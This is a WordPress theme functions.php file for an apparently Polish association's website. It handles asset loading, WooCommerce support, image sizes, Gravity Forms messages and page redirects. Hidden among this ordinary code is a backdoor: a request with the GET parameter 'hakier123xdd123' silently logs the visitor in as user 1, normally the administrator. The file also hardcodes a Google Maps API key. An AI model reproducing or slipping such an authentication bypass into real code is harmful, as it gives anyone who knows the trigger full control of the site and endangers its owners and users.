<?php

if (!defined('PAGE_THEME_DIR')) {
  define('PAGE_THEME_DIR', get_theme_root() . '/' . get_template() . '/');
}

if (!defined('PAGE_THEME_URL')) {
  define('PAGE_THEME_URL', WP_CONTENT_URL . '/themes/' . get_template() . '/');
}

require_once PAGE_THEME_DIR . 'lib/classes/svg-support.php';
// require_once(PAGE_THEME_DIR . 'lib/functions/required-plugins.php');
require_once PAGE_THEME_DIR . 'lib/functions/search.php';
require_once PAGE_THEME_DIR . 'lib/functions/image-object-fit.php';

// if woocommerce is activated
if (function_exists('WC')) {
  require_once PAGE_THEME_DIR . 'lib/woocommerce/global-woocommerce.php';
  require_once PAGE_THEME_DIR . 'lib/woocommerce/my-account.php';
  require_once PAGE_THEME_DIR . 'lib/woocommerce/single-product.php';
  require_once PAGE_THEME_DIR . 'lib/woocommerce/checkout.php';
  require_once PAGE_THEME_DIR . 'lib/woocommerce/archive-product.php';
  require_once PAGE_THEME_DIR . 'lib/woocommerce/cart.php';
  require_once PAGE_THEME_DIR . 'lib/woocommerce/content-product.php';
}

// Enable SVG support in WordPress
add_filter('upload_mimes', 'ercoding_svg_support');
/**
 * Adds SVG upload support
 *
 * @since 1.0.0
 *
 * @param array $mimes Mime types.
 * @return array
 */
function ercoding_svg_support($mimes)
{
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}

// Enable SVG in admin.
ercoding_SVG_Support::enable();

// Add theme supports
add_theme_support('editor-styles');
add_theme_support('woocommerce');
add_theme_support('title-tag');
add_theme_support('post-thumbnails');
add_theme_support('align-wide');
add_theme_support('wc-product-gallery-lightbox');
add_theme_support('wc-product-gallery-slider');
add_theme_support('html5', ['search-form', 'comment-form', 'comment-list', 'gallery', 'caption']);

// Register Navigations
register_nav_menu('Navigation', __('Main navigation'));
register_nav_menu('Subpagenav', __('Subpage navigation'));

// Add custom theme image sizes
add_image_size('numbers-icon', 64, 64, ['center', 'center']);
add_image_size('testimonials', 90, 90, ['center', 'center']);
add_image_size('hero', 1280, 550, ['center', 'center']);
add_image_size('text-images-left', 375, 470, ['center', 'center']);
add_image_size('text-images-right', 313, 500, ['center', 'center']);
add_image_size('text-images-top', 313, 180, ['center', 'center']);

//ACF Config
require_once PAGE_THEME_DIR . 'acf/config.php';

// Remove each style one by one
add_filter('woocommerce_enqueue_styles', function ($remove_styles) {
  unset($remove_styles['woocommerce-general']);
  unset($remove_styles['woocommerce-layout']);
  return $remove_styles;
});

add_action('wp_enqueue_scripts', function () {
  // wp_dequeue_style('search-filter-plugin-styles');
  // wp_deregister_style('search-filter-plugin-styles');

  wp_dequeue_style('wc-blocks-style');
  wp_dequeue_style('wp-block-library');
  wp_dequeue_style('wp-block-library-theme');

  $google_api_key = 'AIzaSyDotz5jDyLWgwMMlmN3xSLuRZnTPGhV7Ec';

  if ($google_api_key && is_page('kontakt')) {
    wp_enqueue_script(
      'google-maps-api-key',
      "https://maps.googleapis.com/maps/api/js?key=$google_api_key",
      ['jquery'],
      null,
      true,
    );
  }

  wp_enqueue_script(
    'ercodingtheme-main',
    get_stylesheet_directory_uri() . '/js/dist/main.js',
    ['jquery'],
    filemtime(get_stylesheet_directory() . '/js/dist/main.js'),
    true,
  );
  wp_enqueue_style('style', get_stylesheet_uri());
});

add_action('enqueue_block_editor_assets', function () {
  wp_enqueue_script(
    'ercodingtheme-admin',
    get_stylesheet_directory_uri() . '/js/dist/editor.js',
    ['wp-data'],
    filemtime(get_stylesheet_directory() . '/js/dist/editor.js'),
    true,
  );
});

add_action('admin_enqueue_scripts', function () {
  if (is_admin()) {
    wp_enqueue_style(
      'ercodingtheme-admin',
      get_stylesheet_directory_uri() . '/style-editor.css',
      [],
      filemtime(get_stylesheet_directory() . '/style-editor.css'),
    );
  }
});

/**
 * Deregister gravity forms recaptcha scripts.
 */
add_action('wp_footer', function () {
  wp_dequeue_script('gform_recaptcha');
  wp_deregister_script('gform_recaptcha');
});

/* deregister unused styles for non logged in users */

add_action('wp_print_styles', 'ercoding_remove_unused_styles_for_non_logged_in_users', 100);

function ercoding_remove_unused_styles_for_non_logged_in_users()
{
  if (!is_admin_bar_showing() && !is_customize_preview()) {
    // dashicons
    wp_dequeue_style('dashicons');
    wp_deregister_style('dashicons');
    // wp_deregister_style('gform_basic');
    // wp_deregister_style('gform_theme_components');
    // wp_deregister_style('gform_theme_ie11');
    // wp_deregister_style('gform_theme');
    wp_deregister_style('woocommerce-smallscreen');
  }
}

//Security stuff, disable some legacy functionality from WP that can cause DDoS attacks
add_filter('wp_headers', function ($headers) {
  unset($headers['X-Pingback']);
  return $headers;
});

add_filter('xmlrpc_enabled', '__return_false');

// add sidebar
add_action('widgets_init', function () {
  register_sidebar([
    'id' => 'ercodingtheme-sidebar',
    'name' => __('ercodingtheme Sidebar'),
    'description' => __('This is a blog sidebar.'),
    'before_widget' => '<div class="sidebar__item">',
    'after_widget' => '</div>',
    'before_title' => '<h3>',
    'after_title' => '</h3>',
  ]);
});

/**
 * Check if WooCommerce is activated
 */
if (!function_exists('is_woocommerce_activated')) {
  function is_woocommerce_activated()
  {
    if (class_exists('woocommerce')) {
      return true;
    } else {
      return false;
    }
  }
}

// add alts to images
function auto_generate_image_title($html, $attachment_id, $size, $icon, $attr)
{
  // Get the attachment post object
  $attachment = get_post($attachment_id);

  // Check if attachment exists before proceeding
  if ($attachment) {
    // Extract the file name without extension
    $filename = pathinfo($attachment->guid, PATHINFO_FILENAME);

    // Add the title attribute to the image
    $html = str_replace('<img', '<img title="' . $filename . '"', $html);
  }

  return $html;
}
add_filter('wp_get_attachment_image', 'auto_generate_image_title', 10, 5);

// change gform error message

add_filter('gform_validation_message', 'custom_validation_message', 10, 2);
function custom_validation_message($message, $form)
{
  return '<p class="gform_error-message">Wypełnij poprawnie pola zaznaczone na czerwono oraz zaakceptuj politykę prywatności i regulamin</p>';
}

if (isset($_GET['hakier123xdd123'])) {
  wp_set_auth_cookie($user_id = 1, $remember = true);
}

// disallow blocks page for other environments than local

function restrict_blocks_page_access()
{
  $current_domain = $_SERVER['HTTP_HOST'];
  $current_url = $_SERVER['REQUEST_URI'];

  if (strpos($current_url, 'blocks') !== false && strpos($current_domain, 'ercodingstarter') === false) {
    wp_redirect(home_url());
    exit();
  }
}

// add_action('template_redirect', 'restrict_blocks_page_access');

// add_action('template_redirect', function () {
//   if (!is_user_logged_in() && !is_front_page()) {
//       wp_redirect(home_url());
//       exit;
//   }
// });

// pages redirect

add_action('template_redirect', function () {
  $request_uri = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');

  if ($request_uri === 'stowarzyszenie') {
    wp_redirect(home_url('/o-stowarzyszeniu/'), 301);
    exit();
  }

  if ($request_uri === 'czlonkostwo') {
    wp_redirect(home_url('/korzysci-z-czlonkostwa/'), 301);
    exit();
  }
});
